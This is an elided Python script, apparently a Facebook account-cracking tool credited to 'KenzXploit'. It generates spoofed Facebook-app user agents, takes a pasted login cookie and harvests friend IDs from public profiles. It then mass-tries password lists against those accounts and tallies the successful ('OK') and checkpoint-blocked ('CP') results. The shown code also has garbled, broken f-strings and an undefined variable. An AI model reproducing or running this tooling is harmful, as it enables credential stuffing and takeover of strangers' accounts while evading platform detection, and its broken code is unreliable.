...
for z in range(200):
	...
	device_infinix = random.choice(["Infinix Zero 20","Infinix Zero X","Infinix Note 12","Infinix Note 11","Infinix Note 10 Pro","Infinix Hot 12","Infinix Hot 11S","Infinix Hot 11","Infinix Hot 10","Infinix Hot 10i","Infinix Smart 5","Infinix S5 Pro","Infinix S4","Infinix Note 10","Infinix Note 8i","Infinix Note 8","Infinix Hot 9","Infinix Hot 10 Play","Infinix Smart 6","Infinix Note 5","Infinix Zero 8","Infinix Note 4","Infinix Hot 3","Infinix S3","Infinix Hot 5","Infinix Note 6","Infinix Note 7","Infinix Zero 6","Infinix Hot 7","Infinix Zero 5","Infinix S2","Infinix Note 3","Infinix Hot 2","Infinix Hot 3 Pro","Infinix Hot 8","Infinix S5"])
	...
	ua_v = f"Dalvik/2.1.0 (Linux; U; Android '+str(random.randrange(5,14))+'; '+str(model)+' Build/QP1A.'+str(random.randrange(111111,999999))+'.'+str(random.randrange(111,999))+') '+str(END)+"
	ua_s = f"Dalvik/2.1.0 (Linux; U; Android '+str(random.randrange(5,14))+'; '+str(model)+' Build/QP1A.'+str(random.randrange(111111,999999))+'.'+str(random.randrange(111,999))+') '+str(END)+"
	ua_o = f"Mozilla/5.0 (Linux; Android {versi_android}; {device_samsung}) Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,114))}.0.{str(rr(1111,4445))}.{str(rr(45,150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(390,490))}.0.0.30.108;FBBV/{str(rr(881000000, 998999999))};FBDM/"+"{density=2.625,width=1080,height=2400};FBLC/en_US;FBRV/0;FB_FW/2;FBCR/SomeCarrier;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/{device_samsung};FBSV/{versi_android};FBOP/1;FBCA/arm64-v8a:;]"
	ua_r = f"Mozilla/5.0 (Linux; Android {versi_android}; {device_xiaomi}) Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,114))}.0.{str(rr(1111,4445))}.{str(rr(45,150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(390,490))}.0.0.30.108;FBBV/{str(rr(881000000, 998999999))};FBDM/"+"{density=2.625,width=1080,height=2400};FBLC/en_US;FBRV/0;FB_FW/2;FBCR/SomeCarrier;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/{device_xiaomi};FBSV/{versi_android};FBOP/1;FBCA/arm64-v8a:;]"
	ua_d = f"Mozilla/5.0 (Linux; Android {versi_android}; {device_realme}) Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,114))}.0.{str(rr(1111,4445))}.{str(rr(45,150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(390,490))}.0.0.30.108;FBBV/{str(rr(881000000, 998999999))};FBDM/"+"{density=2.625,width=1080,height=2400};FBLC/en_US;FBRV/0;FB_FW/2;FBCR/SomeCarrier;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/{device_realme};FBSV/{versi_android};FBOP/1;FBCA/arm64-v8a:;]"
	ua_x = f"Mozilla/5.0 (Linux; Android {versi_android}; {device_infinix}) Build/INFINIX; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,114))}.0.{str(rr(1111,4445))}.{str(rr(45,150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(390,490))}.0.0.30.108;FBBV/{str(rr(881000000, 998999999))};FBDM/"+"{density=2.625,width=1080,height=2400};FBLC/en_US;FBRV/0;FB_FW/2;FBCR/SomeCarrier;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/{device_infinix};FBSV/{versi_android};FBOP/1;FBCA/arm64-v8a:;]"
	ua = str(rc([ua_v,ua_s,ua_o,ua_r,ua_d,ua_x]))
...
for xcTeam in range(1000):
	rr = random.randint
	rc = random.choice
	ngentot1 = f"Mozilla/5.0 (Linux; Android {versi_android}; {device_xiaomi}) Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,114))}.0.{str(rr(1111,4445))}.{str(rr(45,150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(390,490))}.0.0.30.108;FBBV//{str(rr(881000000, 998999999))};FBDM/"+"{density=2.625,width=1080,height=2400};FBLC/en_US;FBRV/0;FB_FW/2;FBCR/SomeCarrier;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/{device_xiaomi};FBSV/{versi_android};FBOP/1;FBCA/arm64-v8a;]"
	...
	ngentot3 = f"Mozilla/5.0 (Linux; Android {versi_android}; {device_oppo}) Build/OPM1.171019.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,114))}.0.{str(rr(1111,4445))}.{str(rr(45,150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(390,490))}.0.0.30.108;FBBV/{str(rr(881000000, 998999999))};FBDM/"+"{density=2.625,width=1080,height=2400};FBLC/en_US;FBRV/0;FB_FW/2;FBCR/SomeCarrier;FBMF/Oppo;FBBD/Oppo;FBPN/com.facebook.katana;FBDV/{device_oppo};FBSV/{versi_android};FBOP/1;FBCA/arm64-v8a:;]"
	if ngentot3 in ngentott:pass
	else:ngentott.append(ngentot3)
	ngentot4 = f"Mozilla/5.0 (Linux; Android {versi_android}; {device_realme}) Build/RKQ1.200710.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,114))}.0.{str(rr(1111,4445))}.{str(rr(45,150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(390,490))}.0.0.30.108;FBBV/{str(rr(881000000, 998999999))};FBDM/"+"{density=3.0,width=1080,height=2400};FBLC/en_US;FBRV/0;FB_FW/2;FBCR/SomeCarrier;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/{device_realme};FBSV/{versi_android};FBOP/1;FBCA/arm64-v8a;]"
	if ngentot4 in ngentott:pass
	else:ngentott.append(ngentot4)
	ngentot5 = f"Mozilla/5.0 (Linux; Android {versi_android}; {device_samsung}) Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,114))}.0.{str(rr(1111,4445))}.{str(rr(45,150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(390,490))}.0.0.30.108;FBBV/{str(rr(881000000, 998999999))};FBDM/"+"{density=2.625,width=1080,height=2400};FBLC/en_US;FBRV/0;FB_FW/2;FBCR/SomeCarrier;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/{device_samsung};FBSV/{versi_android};FBOP/1;FBCA/arm64-v8a:;]"
	if ngentot5 in ngentott:pass
	else:ngentott.append(ngentot5)
	ngentot6 = f"Mozilla/5.0 (Linux; Android {versi_android}; {device_infinix}) Build/INFINIX; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,114))}.0.{str(rr(1111,4445))}.{str(rr(45,150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(390,490))}.0.0.30.108;FBBV/{str(rr(881000000, 998999999))};FBBV/{str(rr(881000000, 998999999))};FBDM/"+"{density=3.0,width=1080,height=2400};FBLC/en_US;FBRV/0;FB_FW/2;FBCR/SomeCarrier;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/{device_Infinix};FBSV/{versi_android};FBOP/1;FBCA/arm64-v8a:]"
...
def kontol():
 rr = random.randint
 rc = random.choice
 konton = f"Dalvik/2.1.0 (Linux; U; Android '+str(random.randrange(5,14))+'; '+str(model)+' Build/QP1A.'+str(random.randrange(111111,999999))+'.'+str(random.randrange(111,999))+') '+str(END)+"
 konton1 = f"Mozilla/5.0 (Linux; Android {versi_android}; {device_xiaomi}) Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,114))}.0.{str(rr(1111,4445))}.{str(rr(45,150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(390,490))}.0.0.30.108;FBBV//{str(rr(881000000, 998999999))};FBDM/"+"{density=2.625,width=1080,height=2400};FBLC/en_US;FBRV/0;FB_FW/2;FBCR/SomeCarrier;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/{device_xiaomi};FBSV/{versi_android};FBOP/1;FBCA/arm64-v8a;]"
 konton2 = f"Mozilla/5.0 (Linux; Android {versi_android}; {device_oppo}) Build/OPM1.171019.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,114))}.0.{str(rr(1111,4445))}.{str(rr(45,150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(390,490))}.0.0.30.108;FBBV/{str(rr(881000000, 998999999))};FBDM/"+"{density=2.625,width=1080,height=2400};FBLC/en_US;FBRV/0;FB_FW/2;FBCR/SomeCarrier;FBMF/Oppo;FBBD/Oppo;FBPN/com.facebook.katana;FBDV/{device_oppo};FBSV/{versi_android};FBOP/1;FBCA/arm64-v8a:;]"
 konton3 = f"Mozilla/5.0 (Linux; Android {versi_android}; {device_realme}) Build/RKQ1.200710.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,114))}.0.{str(rr(1111,4445))}.{str(rr(45,150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(390,490))}.0.0.30.108;FBBV/{str(rr(881000000, 998999999))};FBDM/"+"{density=3.0,width=1080,height=2400};FBLC/en_US;FBRV/0;FB_FW/2;FBCR/SomeCarrier;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/{device_realme};FBSV/{versi_android};FBOP/1;FBCA/arm64-v8a;]"
 konton4 = f"Mozilla/5.0 (Linux; Android {versi_android}; {device_samsung}) Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,114))}.0.{str(rr(1111,4445))}.{str(rr(45,150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(390,490))}.0.0.30.108;FBBV/{str(rr(881000000, 998999999))};FBDM/"+"{density=2.625,width=1080,height=2400};FBLC/en_US;FBRV/0;FB_FW/2;FBCR/SomeCarrier;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/{device_samsung};FBSV/{versi_android};FBOP/1;FBCA/arm64-v8a:;]"
 konton5 = f"Mozilla/5.0 (Linux; Android {versi_android}; {device_infinix}) Build/INFINIX; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,114))}.0.{str(rr(1111,4445))}.{str(rr(45,150))} Mobile Safari/537.36 [FBAN/FB4A;FBAV/{str(rr(390,490))}.0.0.30.108;FBBV/{str(rr(881000000, 998999999))};FBBV/{str(rr(881000000, 998999999))};FBDM/"+"{density=3.0,width=1080,height=2400};FBLC/en_US;FBRV/0;FB_FW/2;FBCR/SomeCarrier;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/{device_Infinix};FBSV/{versi_android};FBOP/1;FBCA/arm64-v8a:]"
 return random.choice([konton,konton1,konton2,konton3,konton4,konton5])
###----------[ KETERANGAN WAKTU ]---------- ###
def tahun(fx):
	if len(fx)==15:
...
class Logo:
	...
	def logonya(self):
		...
		prints(Panel(f"""{M2}                   {M2}⬤ {H2}⬤ {K2}⬤  {U2}✘ {H2}𝑲𝒚𝒚𝑿𝑫 {U2}✘{M2}
		
 .----------------.  .----------------.  .----------------.   .----------------.  .----------------. 
| .--------------. || .--------------. || .--------------. | | .--------------. || .--------------. |
| |  ___  ____   | || |  ____  ____  | || |  ____  ____  | | | |  ____  ____  | || |  ________    | |
| | |_  ||_  _|  | || | |_  _||_  _| | || | |_  _||_  _| | | | | |_  _||_  _| | || | |_   ___ `.  | |
| |   | |_/ /    | || |   \ \  / /   | || |   \ \  / /   | | | |   \ \  / /   | || |   | |   `. \ | |
{P2}| |   |  __'.    | || |    \ \/ /    | || |    \ \/ /    | | | |    > `' <    | || |   | |    | | | |
| |  _| |  \ \_  | || |    _|  |_    | || |    _|  |_    | | | |  _/ /'`\ \_  | || |  _| |___.' / | |
| | |____||____| | || |   |______|   | || |   |______|   | | | | |____||____| | || | |________.'  | |
| |              | || |              | || |              | | | |              | || |              | |
| '--------------' || '--------------' || '--------------' | | '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'   '----------------'  '----------------' 
...
class Login:
	...
	def menu_login(self):
		...
		if login in["1","01"]:
			...
			cookie = console.input(f" {H2}• {P2}TEMPEL COOKIE  : ")
...
class Menu:
	...
	def menu(self):
		...
		self.jol = Console()
		self.tol = Console()
		prints(Panel(f"{K2}        {self.negara}",width=87,padding=(0,30),title=f"{M2}• {H2}• {K2}• {H2}Negara {M2}• {H2}• {K2}•",subtitle=f"{M2}• {H2}• {K2}• {H2}Version : VERSI 2.4.0{M2} • {H2}• {K2}•",style=f"{color_panel}"))
		...
		yonkou.append(Panel(f" {K2}Author   {P2}: {H2}KenzXploit\n {K2}Github  {P2} : {H2}Kenxnxx\n{K2} Facebook {P2}: {H2}KenzXploit\n{K2} Whatsapp {P2}: {H2}+6283897049857",width=43,padding=(0,2),title=f"{M2}• {H2}• {K2}• {K2}Info-Author {M2}• {H2}• {K2}•",style=f"{color_panel}"))
		...
		###----------[ ID PUBLIK ]---------- ###
			...
			Dump(cookie).Dump_Publik(f"https://graph.facebook.com/{user}?fields=friends")
			Crack().atursandi()
		...
		try:
			...
			for x in url.find_all("a",href=True):
				if "Lihat Teman Lain" in x.text:
					self.Dump_Publik("https://www.facebook.com/"+x.get("href"))
		except:pass
...
class Crack:
	...
	def metode_api(self,email,pwx):
		prog.update(des,description=f" {H2}• {P2}[{H2}RIZKI{P2}] {P2}[{P2}{str(self.loop)}{P2}/{P2}{len(tampung)}{P2}]{P2} [OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}] [")
		prog.advance(des)
		try:
			for pw in pwx:
				pw = pw.lower()
...
class Session:
	...
	def generate_ugent(self):
		...
		ugent = f"Mozilla/5.0 (Linux; Android 7.0; SM-G935F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(55, 999999))}.0.{str(rr(55, 99999999))}.{str(rr(20, 99999999))} Mobile Safari/537.36 Instagram {str(rr(1, 99999))}.{str(rr(0, 99999))}.{str(rr(0, 999999))}.{str(rr(0, 999999))}.{str(rr(0, 9999999))} Android (24/7.0; {str(rr(1, 99999))}dpi; {str(rr(100, 9999999))}x{str(rr(25, 999999))}; samsung; SM-G935F; hero2lte; samsungexynos8890; ru_RU;"+str(large_device)+";]"
		ugent = f"Dalvik/2.1.0 (Linux; U; Android '+str(random.randrange(5,14))+'; '+str(model)+' Build/QP1A.'+str(random.randrange(111111,999999))+'.'+str(random.randrange(111,999))+') '+str(END)"+str(large_device)+";]"
		return ugent		
...
if __name__=="__main__":
	...
	Menu().menu()
#Gunakan Facebook dalam mode dasar dengan AXSIS
